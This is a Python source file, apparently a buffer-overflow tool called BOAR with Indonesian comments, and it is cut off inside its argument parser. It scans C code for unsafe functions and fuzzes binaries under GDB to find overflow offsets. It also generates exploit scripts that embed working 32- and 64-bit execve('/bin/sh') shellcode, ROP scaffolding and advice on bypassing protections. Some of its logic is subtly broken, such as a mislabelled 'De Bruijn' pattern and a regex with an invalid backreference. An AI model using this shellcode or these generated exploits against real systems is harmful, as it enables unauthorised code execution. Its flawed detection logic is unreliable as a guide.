#!/usr/bin/env python3
"""
BOAR - Buffer Overflow Analysis & Remediation Framework
Enhanced version with CVE-based detection and advanced exploit generation
"""

import re
import argparse
import os
import sys
import subprocess
import struct
import json
import time
from datetime import datetime

def print_dragon_banner():
    """Print epic dragon breathing BOAR fire banner - inspired by dark fantasy artwork"""
    
    # Color codes for epic effect
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DARK_GRAY = '\033[90m'
    BRIGHT_RED = '\033[101m'
    RESET = '\033[0m'
    
    epic_dragon = f"""
{BOLD}{RED}     ╔══════════════════════════════════════════════════════════════════════════════════════╗{RESET}
{BOLD}{RED}     ║                    🛡️  BOAR SECURITY FRAMEWORK ACTIVATED! 🛡️                      ║{RESET}
{BOLD}{RED}     ╚══════════════════════════════════════════════════════════════════════════════════════╝{RESET}

{BOLD}{WHITE}                             ██████╗  ██████╗  █████╗ ██████╗ {RESET}
{BOLD}{WHITE}                             ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗{RESET}
{BOLD}{RED}                             ██████╔╝██║   ██║███████║██████╔╝{RESET}
{BOLD}{RED}                             ██╔══██╗██║   ██║██╔══██║██╔══██╗{RESET}
{BOLD}{RED}                             ██████╔╝╚██████╔╝██║  ██║██║  ██║{RESET}
{BOLD}{WHITE}                             ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{RESET}

{BOLD}{CYAN}                        BOAR - Buffer Overflow Analysis & Remediation Framework{RESET}
{BOLD}{YELLOW}                            CVE-Based Detection Engine{RESET}
{BOLD}{MAGENTA}                            Advanced Exploit Generation{RESET}
{BOLD}{GREEN}                            Dynamic Crash Analysis{RESET}

{BOLD}{BLUE}     ╔══════════════════════════════════════════════════════════════════════════════════════╗{RESET}
{BOLD}{BLUE}     ║  Born to Hunt Buffer Overflow Vulnerabilities!             ║{RESET}
{BOLD}{BLUE}     ╚══════════════════════════════════════════════════════════════════════════════════════╝{RESET}
"""

    print(epic_dragon)
    
    # Add a small delay for dramatic effect
    time.sleep(0.5)
    
    # Print additional info
    print(f"{BOLD}{WHITE}     🔥 Powered by Real-World CVE Patterns | 🎯 Advanced Exploit Templates | 🛡️ Protection Bypass Techniques{RESET}")
    print(f"{BOLD}{CYAN}     ═══════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
    print()

## =================================================================
## BAGIAN 1: MODUL ANALISIS STATIS DENGAN CVE-BASED DETECTION
## =================================================================

# CVE-based vulnerability patterns dengan referensi CVE nyata
CVE_PATTERNS = {
    'gets': {
        'severity': 'CRITICAL',
        'cve_refs': ['CVE-2012-3489', 'CVE-2015-1781', 'CVE-2016-4051'],
        'description': 'Fungsi gets() tidak melakukan bound checking, sangat mudah di-overflow',
        'remediation': 'Gunakan fgets() dengan buffer size yang tepat',
        'pattern': r'\bgets\s*\(',
        'example_exploit': 'payload = "A" * 1024 + return_address'
    },
    'strcpy': {
        'severity': 'HIGH',
        'cve_refs': ['CVE-2005-1544', 'CVE-2017-14107', 'CVE-2019-9169'],
        'description': 'strcpy() tidak memeriksa ukuran buffer destination',
        'remediation': 'Gunakan strncpy() atau strlcpy() dengan size limit',
        'pattern': r'\bstrcpy\s*\(',
        'example_exploit': 'strcpy(buffer, long_string) -> buffer overflow'
    },
    'strcat': {
        'severity': 'HIGH',
        'cve_refs': ['CVE-2006-1168', 'CVE-2012-2372', 'CVE-2018-16529'],
        'description': 'strcat() tidak memeriksa ukuran buffer destination',
        'remediation': 'Gunakan strncat() dengan size calculation yang benar',
        'pattern': r'\bstrcat\s*\(',
        'example_exploit': 'strcat(buffer, input) -> heap/stack overflow'
    },
    'sprintf': {
        'severity': 'HIGH',
        'cve_refs': ['CVE-2005-0202', 'CVE-2017-9047', 'CVE-2020-12767'],
        'description': 'sprintf() dapat menyebabkan buffer overflow dengan format string',
        'remediation': 'Gunakan snprintf() dengan buffer size limit',
        'pattern': r'\bsprintf\s*\(',
        'example_exploit': 'sprintf(buf, "%s", long_input) -> overflow'
    },
    'scanf': {
        'severity': 'MEDIUM',
        'cve_refs': ['CVE-2012-3489', 'CVE-2015-1781'],
        'description': 'scanf() dengan %s tanpa width specifier dapat overflow',
        'remediation': 'Gunakan scanf("%99s", buffer) atau fgets()',
        'pattern': r'\bscanf\s*\([^)]*%s[^)]*\)',
        'example_exploit': 'scanf("%s", buffer) + long input -> overflow'
    },
    'memcpy': {
        'severity': 'MEDIUM',
        'cve_refs': ['CVE-2016-1238', 'CVE-2019-11477'],
        'description': 'memcpy() tanpa bound checking dapat menyebabkan overflow',
        'remediation': 'Validasi size parameter dan gunakan safe alternatives',
        'pattern': r'\bmemcpy\s*\([^,]+,\s*[^,]+,\s*[^)]*\)',
        'example_exploit': 'memcpy(dst, src, user_controlled_size) -> overflow'
    },
    'vsprintf': {
        'severity': 'HIGH',
        'cve_refs': ['CVE-2005-0202', 'CVE-2017-9047'],
        'description': 'vsprintf() rentan terhadap format string dan buffer overflow',
        'remediation': 'Gunakan vsnprintf() dengan buffer size limit',
        'pattern': r'\bvsprintf\s*\(',
        'example_exploit': 'vsprintf(buffer, format, args) -> overflow'
    },
    'alloca': {
        'severity': 'HIGH',
        'cve_refs': ['CVE-2016-3706', 'CVE-2017-1000366'],
        'description': 'alloca() dengan user input dapat menyebabkan stack overflow',
        'remediation': 'Gunakan malloc() dengan size validation',
        'pattern': r'\balloca\s*\(',
        'example_exploit': 'alloca(user_size) -> stack exhaustion'
    }
}

# Pattern untuk deteksi kerentanan kompleks
COMPLEX_VULNERABILITY_PATTERNS = {
    'format_string': {
        'severity': 'HIGH',
        'cve_refs': ['CVE-2000-0573', 'CVE-2005-1125'],
        'description': 'Format string vulnerability - user input sebagai format string',
        'pattern': r'printf\s*\(\s*[^"]*\s*\)|fprintf\s*\([^,]+,\s*[^"]*\)',
        'remediation': 'Gunakan printf("%s", user_input) bukan printf(user_input)'
    },
    'integer_overflow': {
        'severity': 'MEDIUM',
        'cve_refs': ['CVE-2016-5195', 'CVE-2017-7308'],
        'description': 'Potential integer overflow dalam size calculation',
        'pattern': r'malloc\s*\([^)]*\*[^)]*\)|calloc\s*\([^)]*\*[^)]*\)',
        'remediation': 'Validasi integer overflow sebelum operasi aritmatika'
    },
    'double_free': {
        'severity': 'HIGH',
        'cve_refs': ['CVE-2016-4051', 'CVE-2017-9233'],
        'description': 'Potential double free vulnerability',
        'pattern': r'free\s*\([^)]+\)',
        'remediation': 'Set pointer ke NULL setelah free(), gunakan static analysis'
    },
    'use_after_free': {
        'severity': 'CRITICAL',
        'cve_refs': ['CVE-2017-8890', 'CVE-2018-8897'],
        'description': 'Potential use-after-free vulnerability',
        'pattern': r'free\s*\([^)]+\).*\n.*\1',
        'remediation': 'Hindari penggunaan pointer setelah free()'
    }
}

def analyze_file(filepath):
    """Menganalisis satu file kode untuk mencari fungsi-fungsi berbahaya berdasarkan CVE patterns."""
    findings = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            lines = content.split('\n')
            
            # Analisis CVE-based patterns
            for pattern_name, pattern_info in CVE_PATTERNS.items():
                matches = re.finditer(pattern_info['pattern'], content, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    line_num = content.count('\n', 0, match.start()) + 1
                    line_content = lines[line_num - 1].strip()
                    
                    # Skip jika dalam komentar
                    if line_content.strip().startswith(('//', '/*', '*')):
                        continue
                    
                    findings.append({
                        'line_number': line_num,
                        'function': pattern_name,
                        'severity': pattern_info['severity'],
                        'cve_refs': pattern_info['cve_refs'],
                        'description': pattern_info['description'],
                        'remediation': pattern_info['remediation'],
                        'line_content': line_content,
                        'file': os.path.basename(filepath),
                        'example_exploit': pattern_info.get('example_exploit', 'N/A')
                    })
            
            # Analisis complex vulnerability patterns
            for vuln_type, vuln_info in COMPLEX_VULNERABILITY_PATTERNS.items():
                matches = re.finditer(vuln_info['pattern'], content, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    line_num = content.count('\n', 0, match.start()) + 1
                    line_content = lines[line_num - 1].strip()
                    
                    if line_content.strip().startswith(('//', '/*', '*')):
                        continue
                    
                    findings.append({
                        'line_number': line_num,
                        'function': vuln_type,
                        'severity': vuln_info['severity'],
                        'cve_refs': vuln_info['cve_refs'],
                        'description': vuln_info['description'],
                        'remediation': vuln_info['remediation'],
                        'line_content': line_content,
                        'file': os.path.basename(filepath),
                        'example_exploit': 'Complex pattern - requires manual analysis'
                    })
                    
    except Exception as e:
        print(f"[!] Gagal membaca atau memproses file '{filepath}': {e}")
    return findings

def generate_security_report(findings):
    """Generate comprehensive security report dengan CVE references."""
    if not findings:
        return
    
    # Group findings by severity
    severity_groups = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': []}
    for finding in findings:
        severity = finding.get('severity', 'MEDIUM')
        if severity in severity_groups:
            severity_groups[severity].append(finding)
    
    # Generate report
    report = {
        'timestamp': datetime.now().isoformat(),
        'total_vulnerabilities': len(findings),
        'severity_breakdown': {k: len(v) for k, v in severity_groups.items()},
        'detailed_findings': findings
    }
    
    # Save JSON report
    with open('security_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n[+] Laporan keamanan lengkap disimpan di: security_report.json")
    return report

def run_static_analysis(target_path):
    """Fungsi utama untuk menjalankan seluruh proses analisis statis dengan CVE-based detection."""
    all_findings = []
    print(f"[*] Memulai analisis statis CVE-based pada: {target_path}")
    print(f"[*] Menggunakan {len(CVE_PATTERNS)} CVE patterns dan {len(COMPLEX_VULNERABILITY_PATTERNS)} complex patterns")
    
    if os.path.isfile(target_path):
        all_findings.extend(analyze_file(target_path))
    elif os.path.isdir(target_path):
        for root, _, files in os.walk(target_path):
            for file in files:
                if file.endswith(('.c', '.cpp', '.h', '.cc', '.cxx')):
                    filepath = os.path.join(root, file)
                    print(f"[*] Menganalisis: {filepath}")
                    all_findings.extend(analyze_file(filepath))
    else:
        print(f"[!] Error: Target '{target_path}' bukan file atau direktori yang valid.")
        return

    print("\n" + "="*80)
    print(" LAPORAN ANALISIS KEAMANAN CVE-BASED")
    print("="*80)
    
    if not all_findings:
        print("\n[+] Tidak ditemukan pola kerentanan yang umum. Kode terlihat aman dari analisis statis.")
        return
    
    # Generate comprehensive report
    report = generate_security_report(all_findings)
    
    # Display findings by severity
    severity_colors = {
        'CRITICAL': '\033[91m',  # Red
        'HIGH': '\033[93m',      # Yellow
        'MEDIUM': '\033[94m',    # Blue
        'LOW': '\033[92m'        # Green
    }
    reset_color = '\033[0m'
    
    print(f"\n[!] Ditemukan {len(all_findings)} potensi kerentanan:")
    
    for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
        findings_by_severity = [f for f in all_findings if f.get('severity') == severity]
        if findings_by_severity:
            color = severity_colors.get(severity, '')
            print(f"\n{color}{'='*20} {severity} SEVERITY ({len(findings_by_severity)} items) {'='*20}{reset_color}")
            
            for finding in findings_by_severity:
                print(f"\n  📍 File: `{finding['file']}` | Line: {finding['line_number']}")
                print(f"  🔍 Function/Pattern: `{finding['function']}`")
                print(f"  📝 Description: {finding['description']}")
                print(f"  🎯 CVE References: {', '.join(finding['cve_refs'])}")
                print(f"  💡 Remediation: {finding['remediation']}")
                print(f"  📋 Code: `{finding['line_content']}`")
                print(f"  🚨 Example Exploit: {finding['example_exploit']}")
                print("  " + "-"*70)
    
    # Summary statistics
    print(f"\n{'='*80}")
    print("RINGKASAN KEAMANAN:")
    print(f"{'='*80}")
    print(f"Total kerentanan ditemukan: {len(all_findings)}")
    print(f"Critical: {len([f for f in all_findings if f.get('severity') == 'CRITICAL'])}")
    print(f"High: {len([f for f in all_findings if f.get('severity') == 'HIGH'])}")
    print(f"Medium: {len([f for f in all_findings if f.get('severity') == 'MEDIUM'])}")
    print(f"Low: {len([f for f in all_findings if f.get('severity') == 'LOW'])}")
    
    # Recommendations
    print(f"\n🔧 REKOMENDASI PRIORITAS:")
    if any(f.get('severity') == 'CRITICAL' for f in all_findings):
        print("1. SEGERA perbaiki semua kerentanan CRITICAL")
    if any(f.get('severity') == 'HIGH' for f in all_findings):
        print("2. Prioritaskan perbaikan kerentanan HIGH")
    print("3. Lakukan code review menyeluruh")
    print("4. Implementasikan secure coding practices")
    print("5. Gunakan static analysis tools secara berkala")
    
    print("\n" + "="*80)

## =================================================================
## BAGIAN 2: MODUL ANALISIS DINAMIS DENGAN ADVANCED CRASH DETECTION
## =================================================================

def generate_pattern(length):
    """Membuat string pola De Bruijn yang unik untuk melacak offset dengan presisi tinggi."""
    pattern = b''
    chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    
    # Generate cyclic pattern
    for i in range(length):
        pattern += chars[i % len(chars):i % len(chars) + 1]
    
    # Add unique markers setiap 4 bytes untuk arsitektur 32-bit
    unique_pattern = b''
    for i in range(0, length, 4):
        chunk = pattern[i:i+4]
        if len(chunk) == 4:
            unique_pattern += chunk
        else:
            unique_pattern += chunk + b'X' * (4 - len(chunk))
    
    return unique_pattern[:length]

def find_offset(hex_value, pattern):
    """Mencari offset dengan dukungan multiple architectures dan endianness."""
    try:
        # Try different interpretations
        interpretations = []
        
        # 64-bit little-endian
        try:
            search_bytes = struct.pack('<Q', int(hex_value, 16))
            offset = pattern.find(search_bytes)
            if offset != -1:
                interpretations.append((offset, 64, 'little-endian'))
        except (struct.error, ValueError):
            pass
        
        # 32-bit little-endian
        try:
            search_bytes = struct.pack('<I', int(hex_value, 16))
            offset = pattern.find(search_bytes)
            if offset != -1:
                interpretations.append((offset, 32, 'little-endian'))
        except (struct.error, ValueError):
            pass
        
        # 32-bit big-endian
        try:
            search_bytes = struct.pack('>I', int(hex_value, 16))
            offset = pattern.find(search_bytes)
            if offset != -1:
                interpretations.append((offset, 32, 'big-endian'))
        except (struct.error, ValueError):
            pass
        
        # Return the most likely interpretation (prefer little-endian, then 32-bit)
        if interpretations:
            # Sort by preference: little-endian first, then 32-bit
            interpretations.sort(key=lambda x: (x[2] != 'little-endian', x[1] != 32))
            return interpretations[0]
        
    except Exception as e:
        print(f"[!] Error dalam analisis offset: {e}")
    
    return None, None, None

def analyze_crash_pattern(gdb_output):
    """Menganalisis pola crash untuk memberikan insight yang lebih baik."""
    crash_info = {
        'crash_type': 'unknown',
        'exploitability': 'unknown',
        'registers': {},
        'stack_info': '',
        'recommendations': []
    }
    
    # Detect crash type
    if "SIGSEGV" in gdb_output:
        crash_info['crash_type'] = 'segmentation_fault'
    elif "SIGABRT" in gdb_output:
        crash_info['crash_type'] = 'abort_signal'
    elif "double free" in gdb_output.lower():
        crash_info['crash_type'] = 'double_free'
    elif "stack smashing" in gdb_output.lower():
        crash_info['crash_type'] = 'stack_smashing'
    
    # Extract register information
    reg_patterns = [
        r'(eip|rip)\s+(0x[0-9a-fA-F]+)',
        r'(esp|rsp)\s+(0x[0-9a-fA-F]+)',
        r'(ebp|rbp)\s+(0x[0-9a-fA-F]+)',
        r'(eax|rax)\s+(0x[0-9a-fA-F]+)'
    ]
    
    for pattern in reg_patterns:
        matches = re.finditer(pattern, gdb_output, re.IGNORECASE)
        for match in matches:
            reg_name, reg_value = match.groups()
            crash_info['registers'][reg_name.upper()] = reg_value
    
    # Analyze exploitability
    if crash_info['crash_type'] == 'segmentation_fault':
        if any(reg in crash_info['registers'] for reg in ['EIP', 'RIP']):
            crash_info['exploitability'] = 'high'
            crash_info['recommendations'].append('Instruction pointer dapat dikontrol - kemungkinan besar exploitable')
        else:
            crash_info['exploitability'] = 'medium'
            crash_info['recommendations'].append('Crash terdeteksi tapi IP tidak terkontrol - perlu analisis lebih lanjut')
    
    # Stack analysis
    if "stack smashing" in gdb_output.lower():
        crash_info['recommendations'].append('Stack canary terdeteksi - bypass diperlukan untuk eksploitasi')
    
    # Memory protection analysis
    if "NX" in gdb_output or "DEP" in gdb_output:
        crash_info['recommendations'].append('NX/DEP aktif - gunakan ROP/JOP untuk eksploitasi')
    
    if "ASLR" in gdb_output:
        crash_info['recommendations'].append('ASLR aktif - perlu information leak untuk bypass')
    
    return crash_info

def check_binary_protections(binary_path):
    """Memeriksa proteksi keamanan yang aktif pada binary."""
    protections = {
        'canary': False,
        'nx': False,
        'pie': False,
        'relro': False,
        'aslr': False
    }
    
    try:
        # Check with readelf if available
        result = subprocess.run(['readelf', '-a', binary_path], 
                              capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
        
        # Analyze protections
        if 'stack_chk_fail' in output:
            protections['canary'] = True
        if 'GNU_STACK' in output and 'RWE' not in output:
            protections['nx'] = True
        if 'DYN' in output:
            protections['pie'] = True
        if 'GNU_RELRO' in output:
            protections['relro'] = True
            
    except (subprocess.TimeoutExpired, FileNotFoundError):
        # Fallback to basic file analysis
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
                if b'stack_chk_fail' in content:
                    protections['canary'] = True
        except:
            pass
    
    return protections

def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin'):
    """Metode analisis dinamis yang disempurnakan dengan crash analysis."""
    if not os.path.isfile(binary_path) or not os.access(binary_path, os.X_OK):
        print(f"[!] Error: File '{binary_path}' tidak valid atau tidak bisa dieksekusi.")
        return

    print(f"[*] Memulai analisis dinamis pada: {binary_path}")
    
    # Check binary protections
    print("[*] Memeriksa proteksi keamanan binary...")
    protections = check_binary_protections(binary_path)
    print(f"[*] Proteksi aktif: {[k for k, v in protections.items() if v]}")
    
    # Generate payload
    payload = generate_pattern(payload_length)
    print(f"[*] Membuat payload pola unik dengan panjang: {len(payload)} bytes")
    print(f"[*] Menggunakan metode input: {method.upper()}")

    # Prepare GDB command
    gdb_commands = [
        "set pagination off",
        "set confirm off",
        "set print elements 0",
        "run",
        "info registers",
        "bt",
        "info proc mappings",
        "quit"
    ]
    
    gdb_command = ["gdb", "-q", "--batch"]
    for cmd in gdb_commands:
        gdb_command.extend(["-ex", cmd])
    
    try:
        if method == 'stdin':
            gdb_command.extend(["--args", binary_path])
            print("[*] Menjalankan GDB dan menyalurkan payload melalui STDIN...")
            gdb_process = subprocess.run(gdb_command, input=payload, capture_output=True, timeout=60)
        elif method == 'argv':
            gdb_command.extend(["--args", binary_path, payload.decode('latin-1')])
            print("[*] Menjalankan GDB dan menyalurkan payload melalui ARGV...")
            gdb_process = subprocess.run(gdb_command, capture_output=True, timeout=60)
        else:
            print(f"[!] Method '{method}' tidak didukung.")
            return

        gdb_output = gdb_process.stdout.decode('utf-8', 'ignore') + gdb_process.stderr.decode('utf-8', 'ignore')

        if debug:
            print(f"\n{'='*20}  OUTPUT MENTAH GDB (DEBUG MODE)  {'='*20}")
            print(gdb_output)
            print("="*70 + "\n")

        # Analyze crash
        crash_info = analyze_crash_pattern(gdb_output)
        
        print(f"\n{'='*60}")
        print("HASIL ANALISIS CRASH")
        print("="*60)
        print(f"Crash Type: {crash_info['crash_type']}")
        print(f"Exploitability: {crash_info['exploitability']}")
        
        if crash_info['registers']:
            print(f"\nRegister States:")
            for reg, value in crash_info['registers'].items():
                print(f"  {reg}: {value}")
        
        if crash_info['crash_type'] == 'segmentation_fault':
            print("\n[!!!] CRASH TERDETEKSI! (Segmentation Fault)")
            
            # Check if instruction pointer is controlled
            ip_reg = None
            ip_value = None
            
            if 'EIP' in crash_info['registers']:
                ip_reg, ip_value = 'EIP', crash_info['registers']['EIP']
            elif 'RIP' in crash_info['registers']:
                ip_reg, ip_value = 'RIP', crash_info['registers']['RIP']
            
            if ip_reg and ip_value:
                print(f"[+] Instruction Pointer ({ip_reg}) tertimpa dengan nilai: {ip_value}")
                
                # Find offset
                offset, arch, endian = find_offset(ip_value, payload)
                if offset is not None:
                    print(f"[+] 🎯 Offset kerentanan berhasil ditemukan: {offset}")
                    print(f"[+] Arsitektur: {arch}-bit ({endian})")
                    
                    # Generate exploit template
                    print(f"\n[+] REKOMENDASI EKSPLOITASI:")
                    print(f"  1. Buat skrip PoC: python {sys.argv[0]} poc {binary_path} --offset {offset}")
                    print(f"  2. Gunakan offset {offset} untuk mengontrol {ip_reg}")
                    
                    if protections['canary']:
                        print(f"  3. ⚠️  Stack canary aktif - perlu bypass atau leak canary")
                    if protections['nx']:
                        print(f"  4. ⚠️  NX/DEP aktif - gunakan ROP chains")
                    if protections['pie']:
                        print(f"  5. ⚠️  PIE aktif - perlu information leak untuk alamat base")
                    
                    # Suggest payload structure
                    print(f"\n[+] STRUKTUR PAYLOAD YANG DISARANKAN:")
                    print(f"  payload = b'A' * {offset} + p32/p64(return_address)")
                    if protections['canary']:
                        print(f"  # Perlu leak canary dan masukkan di offset yang tepat")
                    if protections['nx']:
                        print(f"  # Tambahkan ROP chain setelah return address")
                    
                else:
                    print(f"[-] {ip_reg} tertimpa ({ip_value}) tetapi tidak ditemukan dalam payload pattern")
                    print(f"    Kemungkinan: transformasi data, encoding, atau indirect overwrite")
            else:
                print(f"[-] Crash terdeteksi tapi instruction pointer tidak terkontrol")
                print(f"    Kemungkinan penyebab: stack canary, heap overflow, atau protection mechanism")
        
        elif crash_info['crash_type'] == 'stack_smashing':
            print("\n[!!!] STACK SMASHING TERDETEKSI!")
            print("[*] Stack canary/guard berhasil mendeteksi overflow")
            print("[*] Untuk eksploitasi, perlu bypass stack canary")
            
        elif crash_info['crash_type'] == 'abort_signal':
            print("\n[!!!] ABORT SIGNAL TERDETEKSI!")
            print("[*] Program di-abort, kemungkinan karena heap corruption atau assertion failure")
            
        # Print recommendations
        if crash_info['recommendations']:
            print(f"\n[+] REKOMENDASI KEAMANAN:")
            for i, rec in enumerate(crash_info['recommendations'], 1):
                print(f"  {i}. {rec}")
        
        # Print protection bypass advice
        if any(protections.values()):
            print(f"\n[+] STRATEGI BYPASS PROTEKSI:")
            if protections['canary']:
                print("  - Stack Canary: Cari format string bug atau information leak")
            if protections['nx']:
                print("  - NX/DEP: Gunakan ROP (Return Oriented Programming)")
            if protections['pie']:
                print("  - PIE: Cari information leak untuk menentukan base address")
            if protections['aslr']:
                print("  - ASLR: Kombinasikan dengan PIE bypass atau heap spray")

    except subprocess.TimeoutExpired:
        print("[!] Timeout - proses GDB melebihi batas waktu")
    except Exception as e:
        print(f"[!] Error dalam analisis dinamis: {e}")
        
    print("\n" + "="*60)

## =================================================================
## BAGIAN 3: MODUL PEMBUATAN PROOF OF CONCEPT (POC) DENGAN EXPLOIT TEMPLATES
## =================================================================

def generate_advanced_poc_script(binary_path, offset, arch=32, protections=None):
    """Membuat file exploit.py dengan template yang lebih canggih berdasarkan proteksi binary."""
    if protections is None:
        protections = check_binary_protections(binary_path)
    
    poc_filename = f"exploit_{os.path.basename(binary_path)}.py"
    
    # Determine architecture-specific settings
    if arch == 64:
        addr_format = "Q"
        ptr_size = 8
        sample_addr = "0x0000414141414141"
    else:
        addr_format = "I"
        ptr_size = 4
        sample_addr = "0x41414141"
    
    # Generate exploit template based on protections
    exploit_template = f"""#!/usr/bin/env python3
\"\"\"
Advanced Buffer Overflow Exploit Template
Target: {binary_path}
Offset: {offset}
Architecture: {arch}-bit
Protections: {[k for k, v in protections.items() if v]}
Generated by BOAR (Buffer Overflow Analysis & Remediation)
\"\"\"

import subprocess
import struct
import sys
import os

# --- Configuration ---
BINARY_PATH = "{binary_path}"
OFFSET = {offset}
ARCH = {arch}
PROTECTIONS = {protections}

# --- Exploit Functions ---
def p{arch}(addr):
    \"\"\"Pack address for {arch}-bit architecture\"\"\"
    return struct.pack("<{addr_format}", addr)

def build_payload():
    \"\"\"Build the exploit payload\"\"\"
    payload = b'A' * OFFSET
    
    # === BASIC CONTROL FLOW HIJACKING ===
    # Replace 0xdeadbeef with your target address
    target_address = {sample_addr}
    payload += p{arch}(target_address)
    
    # === ADVANCED EXPLOITATION TECHNIQUES ===
    
    {"# Stack Canary Protection Detected" if protections.get('canary') else "# No Stack Canary"}
    {"# You'll need to leak the canary value first" if protections.get('canary') else ""}
    {"# canary_value = leaked_canary" if protections.get('canary') else ""}
    {"# payload = b'A' * (OFFSET - 8) + p64(canary_value) + b'A' * 8 + p64(target_address)" if protections.get('canary') and arch == 64 else ""}
    
    {"# NX/DEP Protection Detected - Use ROP" if protections.get('nx') else "# No NX/DEP - Shellcode execution possible"}
    if protections.get('nx'):
        payload += build_rop_chain()
    else:
        payload += build_shellcode()
    
    return payload

def build_rop_chain():
    \"\"\"Build ROP chain for NX bypass\"\"\"
    # TODO: Find ROP gadgets using ropper or ROPgadget
    # ropper --file {binary_path} --search "pop rdi"
    rop_chain = b""
    
    # Example ROP chain for system("/bin/sh")
    # rop_chain += p{arch}(pop_rdi_gadget)
    # rop_chain += p{arch}(bin_sh_string_addr)
    # rop_chain += p{arch}(system_addr)
    
    return rop_chain

def build_shellcode():
    \"\"\"Build shellcode for direct execution\"\"\"
    # NOP sled
    nop_sled = b'\\x90' * 16
    
    # Shellcode examples
    if ARCH == 32:
        # 32-bit execve("/bin/sh") shellcode
        shellcode = (
            b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
            b"\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"
        )
    else:
        # 64-bit execve("/bin/sh") shellcode
        shellcode = (
            b"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68"
            b"\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05"
        )
    
    return nop_sled + shellcode

def exploit():
    \"\"\"Main exploit function\"\"\"
    print("[*] Building exploit payload...")
    payload = build_payload()
    
    print(f"[*] Payload length: {{len(payload)}} bytes")
    print(f"[*] Offset: {{OFFSET}} bytes")
    print(f"[*] Target architecture: {{ARCH}}-bit")
    print(f"[*] Active protections: {{[k for k, v in PROTECTIONS.items() if v]}}")
    
    # Launch target
    print(f"[*] Launching target: {{BINARY_PATH}}")
    
    try:
        # Method 1: Direct execution with stdin
        process = subprocess.Popen(
            [BINARY_PATH], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate(input=payload, timeout=10)
        
        print("[+] Payload sent successfully!")
        
        if stdout:
            print(f"[+] STDOUT:\\n{{stdout.decode('utf-8', errors='ignore')}}")
        if stderr:
            print(f"[!] STDERR:\\n{{stderr.decode('utf-8', errors='ignore')}}")
        
        return_code = process.returncode
        print(f"[*] Process exited with code: {{return_code}}")
        
        if return_code < 0:
            print("[+] Process crashed - potential exploitation!")
        
    except subprocess.TimeoutExpired:
        print("[!] Process timeout - might be hanging (good sign!)")
        process.kill()
    except Exception as e:
        print(f"[!] Error during exploitation: {{e}}")

def info():
    \"\"\"Display exploit information\"\"\"
    print("="*60)
    print("EXPLOIT INFORMATION")
    print("="*60)
    print(f"Target Binary: {{BINARY_PATH}}")
    print(f"Buffer Offset: {{OFFSET}} bytes")
    print(f"Architecture: {{ARCH}}-bit")
    print(f"Protections: {{PROTECTIONS}}")
    print()
    print("EXPLOITATION STRATEGY:")
    
    if PROTECTIONS.get('canary'):
        print("  1. ⚠️  Stack Canary: Need to leak canary value first")
    if PROTECTIONS.get('nx'):
        print("  2. ⚠️  NX/DEP: Use ROP chain for code execution")
    if PROTECTIONS.get('pie'):
        print("  3. ⚠️  PIE: Need information leak for base address")
    if PROTECTIONS.get('aslr'):
        print("  4. ⚠️  ASLR: Combine with PIE bypass techniques")
    
    if not any(PROTECTIONS.values()):
        print("  ✅ No major protections detected - direct exploitation possible")
    
    print()
    print("RECOMMENDED TOOLS:")
    print("  - ropper: Find ROP gadgets")
    print("  - pwntools: Exploitation framework")
    print("  - gdb-peda: Enhanced debugging")
    print("  - checksec: Verify binary protections")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "info":
            info()
        else:
            exploit()
    else:
        print("Usage:")
        print(f"  python3 {{sys.argv[0]}} [info]")
        print("  Default: Run basic exploit")
        exploit()
"""
    
    with open(poc_filename, "w") as f:
        f.write(exploit_template)
    
    print(f"\n[+] 🎯 Advanced PoC script generated: '{poc_filename}'")
    print(f"[*] Usage:")
    print(f"  python3 {poc_filename}          # Basic exploit")
    print(f"  python3 {poc_filename} info     # Show exploit info")

def generate_poc_script(binary_path, offset):
    """Legacy function for backward compatibility"""
    # Check binary protections
    protections = check_binary_protections(binary_path)
    
    # Determine architecture (simple heuristic)
    try:
        result = subprocess.run(['file', binary_path], capture_output=True, text=True)
        if '64-bit' in result.stdout:
            arch = 64
        else:
            arch = 32
    except:
        arch = 32  # Default to 32-bit
    
    generate_advanced_poc_script(binary_path, offset, arch, protections)

## =================================================================
## BAGIAN 4: FUNGSI UTAMA DAN PARSER ARGUMEN YANG DISEMPURNAKAN
## =================================================================

def main():
    parser = argparse.ArgumentParser(
        description="🛡️  BOAR - Advanced Buffer Overflow Analysis & Remediation Framework",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  # Static analysis with CVE-based detection
  python BOAR_beta.py static /path/to/code
  
  # Dynamic analysis with advanced crash detection
  python BOAR_beta.py dynamic ./vulnerable_binary -l 1000 -m stdin
  
  # Generate advanced PoC with exploit templates
  python BOAR_beta.py poc ./vulnerable_binary -o 268
        """
    )
    
    subparsers = parser.add_subparsers(dest="command", required=True, help="Available commands")

    # Static analysis command
    parser_static = subparsers.add_parser("static", help="CVE-based static analysis")
    parser_static.add_argument("target", help="File or directory to analyze")
    parser_static.add_argument("--output", "-o", help="Output format (json/text)", default="text")
